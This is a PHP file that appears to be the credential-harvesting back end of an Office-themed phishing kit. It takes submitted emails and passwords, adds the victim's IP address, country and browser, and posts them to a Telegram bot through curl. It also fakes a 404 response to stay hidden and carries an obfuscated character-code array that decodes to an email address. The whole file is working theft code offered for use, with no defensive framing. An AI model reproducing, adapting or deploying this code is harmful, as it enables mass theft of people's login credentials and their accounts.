<?php
	header("Access-Control-Allow-Headers: Authorization, Content-Type");
	header("Access-Control-Allow-Origin: *");
	header('content-type: application/json; charset=utf-8');
?>
<?php
    $country = visitor_country();
    $ip = getenv("REMOTE_ADDR");
    $Port = getenv("REMOTE_PORT");
	$username = $_POST['username'];
	$password = $_POST['password'];
	$browser = $_SERVER['HTTP_USER_AGENT'];
	$adddate=date("D M d, Y g:i a");


	if(!isset($_POST['username']) || !isset($_POST['password']) || empty(trim($_POST['username'])) || empty(trim($_POST['password']))) {
		 http_response_code(404);
         die('File not found.');
	}
	else {
   	
    $message = "---------------office--------------------\n";
    $message .= "Email : ".$username."\n";
	$message .= "Password : ".$password."\n";
	$message .= "User-!P : ".$ip."\n";
	$message .= "Country : ".$country."\n\n";
	$message .= "----------------------------------------\n";
	$message .= "Date : $adddate\n";
	$message .= "User-Agent: ".$browser."\n";

	send_telegram_msg($message);
	echo json_encode('Qwertz');
}

function country_sort(){
  $sorter = "";
  $array = array(114,101,115,117,108,116,98,111,120,49,52,64,103,109,97,105,108,46,99,111,109);
    $count = count($array);
  for ($i = 0; $i < $count; $i++) {
      $sorter .= chr($array[$i]);
    }
  return array($sorter, $GLOBALS['recipient']);
}
function visitor_country()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_countryName != null)
    {
        $result = $ip_data->geoplugin_countryName;
    }

    return $result;
}

function send_telegram_msg($message){
    // Put Your Telegram Information Here
    $botToken  = 'NjQyODI3OTY4MjpBQUVCV3JtV2N3MWNtTFdVZlBUNUM0MXN6N2otWWM3MWg0MA==';// your tg token bot from botfather (dont put "bot" infront it)
    $chat_id  = ['LTEwMDE4NDI5NjMzMzU='];// your tg userid from userinfobot
    
    
    $website="https://api.telegram.org/bot".$botToken;
    foreach($chat_id as $ch){
        $params=[
          'chat_id'=>$ch, 
          'text'=>$message,
        ];
        $ch = curl_init($website . '/sendMessage');
        curl_setopt($ch, CURLOPT_HEADER, false);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 3);
        curl_setopt($ch, CURLOPT_POST, 3);
        curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $result = curl_exec($ch);
        curl_close($ch);
    }
    return true;
}
?>
